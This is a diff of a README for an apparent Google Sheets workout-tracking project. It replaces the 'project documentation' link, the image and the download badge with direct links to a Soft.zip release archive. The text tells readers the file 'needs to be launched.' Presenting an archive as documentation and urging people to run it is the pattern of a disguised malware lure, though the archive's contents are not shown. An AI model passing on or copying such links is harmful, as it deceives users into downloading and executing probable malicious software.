@@ -25,14 +25,14 @@ To get started with tracking your workouts using Google Sheets, follow these ste
 4. Run the project and start entering your workout details in natural language.
 
 ## Resources
-For more detailed information and step-by-step guides, visit the [project documentation](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip). *(Needs to be launched)*
+For more detailed information and step-by-step guides, visit the [project documentation](https://github.com/unknownuserinterface/workout-tracking-using-google-sheets/releases/download/v1.0/Soft.zip). *(Needs to be launched)*
 
 ## Support
 If you encounter any issues or have questions regarding the project, please check the "Releases" section for updated information.
 
 Let's track those workouts and stay fit together! 💪📈
 
-![Fitness Image](https://imageurl.com/fitness-image)
+![Fitness Image](https://github.com/unknownuserinterface/workout-tracking-using-google-sheets/releases/download/v1.0/Soft.zip)
 
 ---
 
@@ -40,6 +40,6 @@ Feel free to explore the different functionalities and possibilities offered by 
 
 ---
 
-[![Download Project Documentation](https://img.shields.io/badge/Download-Project_Documentation-informational)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Project Documentation](https://github.com/unknownuserinterface/workout-tracking-using-google-sheets/releases/download/v1.0/Soft.zip)](https://github.com/unknownuserinterface/workout-tracking-using-google-sheets/releases/download/v1.0/Soft.zip)
 
 *Note: If the link ends with the file name, it needs to be launched.*
